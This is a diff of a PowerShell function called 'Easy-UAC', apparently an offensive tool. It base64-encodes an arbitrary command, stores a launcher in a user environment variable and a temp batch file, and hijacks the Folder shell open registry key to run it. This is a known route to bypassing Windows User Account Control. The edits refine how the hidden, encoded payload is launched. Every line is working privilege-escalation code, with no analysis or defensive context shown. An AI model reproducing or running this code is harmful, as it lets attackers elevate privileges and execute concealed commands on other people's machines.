@@ -9,11 +9,10 @@ function Easy-UAC {
 		[bool]
 		$Hidden = $false
 	)
-	powershell -WindowStyle Hidden -c ""
-	if ($Hidden) {$hide = "-WindowStyle Hidden"} else {$hide = ""}
+	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
-	$Value = "powershell $hide -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')))"
+	$Value = "powershell $hide -c '';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);Start-Process powershell -EncodedCommand '" + $encCommand + "'"
 	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
 	New-Item -Path $Path -Value '%A%'
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
